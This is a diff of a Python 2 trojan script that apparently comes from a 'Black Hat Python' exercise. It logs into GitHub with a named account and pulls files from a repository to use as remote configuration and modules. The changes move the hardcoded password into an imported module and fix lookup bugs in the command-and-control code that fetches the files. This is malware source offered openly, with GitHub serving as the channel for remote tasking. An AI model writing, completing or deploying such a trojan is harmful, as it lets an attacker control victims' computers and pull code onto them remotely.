@@ -1,6 +1,6 @@
 #!/usr/bin/python
 import json, base64, sys, time, imp, random, threading, Queue, os
-
+import github_pass
 from github3 import login
 
 trojan_id = "abc"
@@ -10,10 +10,11 @@ data_path       = "data/%s/" % trojan_id
 trojan_modules  = []
 configured      = False
 task_queue      = Queue.Queue()
+github_passwd   = github_pass.password
 
 
 def connect_to_github():
-    gh = login(username="taishi8117",password="password")
+    gh = login(username="taishi8117",password=github_passwd)
     repo = gh.repository("taishi8117","blackhat_python")
     branch = repo.branch("master")
 
@@ -24,9 +25,9 @@ def get_file_contents(filepath):
     tree = branch.commit.commit.tree.recurse()
 
     for filename in tree.tree:
-        if filename in filename.path:
+        if filepath in filename.path:
             print "[*] Found file %s" % filepath
-            blob = repo.blob(filename.__json_data['sha'])
+            blob = repo.blob(filename._json_data['sha'])
             return blob.content
 
     return None
